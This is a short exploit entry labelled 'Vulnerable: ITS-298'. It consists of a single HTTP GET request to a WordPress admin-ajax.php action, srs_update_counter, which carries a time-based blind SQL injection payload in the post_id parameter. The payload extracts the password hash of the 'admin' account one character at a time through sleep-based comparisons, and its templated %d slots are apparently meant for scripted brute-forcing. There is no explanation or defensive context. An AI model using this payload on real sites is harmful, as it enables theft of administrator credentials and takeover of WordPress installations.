# Vulnerable: ITS-298
GET /wp-admin/admin-ajax.php?action=srs_update_counter&post_id=1+and+1=0)+union+select+(select+if(ascii(substring((select+user_pass+from+wp_users+where+user_login=char(97,100,109,105,110)),%d,1))=%d,sleep(6),sleep(0))),1,1,1,1,1;--
